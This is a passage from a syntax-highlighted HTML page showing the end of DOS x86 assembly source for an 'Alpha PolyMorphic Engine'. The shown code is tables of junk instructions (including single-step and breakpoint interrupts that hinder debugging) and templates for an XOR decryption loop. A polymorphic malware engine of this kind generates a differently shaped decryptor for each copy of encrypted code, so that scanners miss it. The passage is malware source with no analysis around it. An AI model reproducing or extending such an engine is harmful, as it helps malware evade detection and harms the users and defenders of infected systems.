         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">int_03h</span><span class="sc0">         </span><span class="sc1">; Offset of int_03h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">int_03h_</span><span class="sc0">        </span><span class="sc1">; Offset of int_03h_</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">cwd_</span><span class="sc0">        </span><span class="sc1">; Offset of cwd_</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">rcl_dx_01h</span><span class="sc0">      </span><span class="sc1">; Offset of rcl_dx_01h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">add_dx_ax</span><span class="sc0">       </span><span class="sc1">; Offset of add_dx_ax</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">sub_di_bp_di</span><span class="sc0">    </span><span class="sc1">; Offset of sub_di_bp_di</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">add_bp_bx</span><span class="sc0">       </span><span class="sc1">; Offset of add_bp_bx</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">mov_bp_00h</span><span class="sc0">      </span><span class="sc1">; Offset of mov_bp_00h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">add_bp_sp</span><span class="sc0">       </span><span class="sc1">; Offset of add_bp_sp</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">push_ss_pop_</span><span class="sc0">    </span><span class="sc1">; Offset of push_ss_pop_</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">add_bp_cx</span><span class="sc0">       </span><span class="sc1">; Offset of add_bp_cx</span><span class="sc0">
</span><span class="sc5">garbage_tbl_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">int_01h</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; Single step</span><span class="sc0">
</span><span class="sc5">sti_</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; One byte opcode</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">
</span><span class="sc5">cli_</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; One byte opcode</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
</span><span class="sc5">std_</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; One byte opcode</span><span class="sc0">
         </span><span class="sc6">std</span><span class="sc0">             </span><span class="sc1">; Set direction flag</span><span class="sc0">
</span><span class="sc5">cld_</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; One byte opcode</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
</span><span class="sc5">int_03h</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; One byte opcode</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; Breakpoint</span><span class="sc0">
</span><span class="sc5">int_03h_</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000001111001101b</span><span class="sc0">   </span><span class="sc1">; INT 03h (opcode 0cdh,03h)</span><span class="sc0">
</span><span class="sc5">cwd_</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; One byte opcode</span><span class="sc0">
         </span><span class="sc6">cwd</span><span class="sc0">             </span><span class="sc1">; Convert word to doubleword</span><span class="sc0">
</span><span class="sc5">rcl_dx_01h</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc6">rcl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Rotate DX one bit left through c...</span><span class="sc0">
</span><span class="sc5">add_dx_ax</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Add AX to DX</span><span class="sc0">
</span><span class="sc5">sub_di_bp_di</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Subtract the immediate at [BP+DI...</span><span class="sc0">
</span><span class="sc5">add_bp_bx</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add BX to BP</span><span class="sc0">
</span><span class="sc5">mov_bp_00h</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; Three bytes opcode</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Zero BP</span><span class="sc0">
</span><span class="sc5">add_bp_sp</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; Add SP to BP</span><span class="sc0">
</span><span class="sc5">push_ss_pop_</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">          </span><span class="sc1">; Save SS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack (SS)</span><span class="sc0">
</span><span class="sc5">add_bp_cx</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Add CX to BP</span><span class="sc0">
</span><span class="sc5">table_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">decrypt_tbl</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">jmp_imm8</span><span class="sc0">        </span><span class="sc1">; Offset of jmp_imm8</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">dec_bx_jnz_i</span><span class="sc0">    </span><span class="sc1">; Offset of dec_bx_jnz_i</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">xor_cs__bx_s</span><span class="sc0">    </span><span class="sc1">; Offset of xor_cs__bx_</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">decrypt_loop</span><span class="sc0">    </span><span class="sc1">; Offset of decrypt_loop</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">mov_si_imm16</span><span class="sc0">    </span><span class="sc1">; Offset of mov_si_imm16</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">mov_bx_imm16</span><span class="sc0">    </span><span class="sc1">; Offset of mov_bx_imm16</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">mov_al_imm8</span><span class="sc0">     </span><span class="sc1">; Offset of mov_al_imm8</span><span class="sc0">
</span><span class="sc5">table_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">decrypt_tbl_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">mov_al_imm8</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; One byte opcode</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; 8-bit immediate + 01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; AL = encryption/decryption key</span><span class="sc0">
</span><span class="sc5">mov_bx_imm16</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; Three bytes opcode</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; No immediate</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">mov_si_imm16</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; One byte opcode</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; 16-bit immediate + 01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; SI = offset of encrypted code</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; No opcode</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; No immediate + 01h</span><span class="sc0">
</span><span class="sc5">xor_cs__bx_s</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc0">         </span><span class="sc1">; Four bytes opcode</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; No immediate</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Decrypt a byte of encrypted code</span><span class="sc0">
</span><span class="sc5">dec_bx_jnz_i</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; 8-bit immediate + 01h</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Decrease index register</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc0">       </span><span class="sc1">; Not zero? Jump to generation abo...</span><span class="sc0">
</span><span class="sc5">jmp_imm8</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; No immediate</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc0">

</span><span class="sc5">index_ptr</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Index pointer</span><span class="sc0">
</span><span class="sc5">mov_al_i_off</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Offset of MOV AL,imm8 (Decrypti...)</span><span class="sc0">
</span><span class="sc5">mov_si_i_off</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Offset of MOV SI,imm16 (Offset ...)</span><span class="sc0">
</span><span class="sc5">decrypt__off</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Offset of garbage generation abo...</span><span class="sc0">
</span><span class="sc5">dec_bx_j_off</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Offset of DEC BX; JNZ imm8 (Gar...)</span><span class="sc0">

</span><span class="sc5">apme_end</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">; End of Alpha PolyMorphic Engine ...</span><span class="sc0">
</span><span class="sc5">apme_length</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">apme_begin</span><span class="sc0">    </span><span class="sc1">; Size of Alpha PolyMorphic Engine...</span></div></body>
</html>
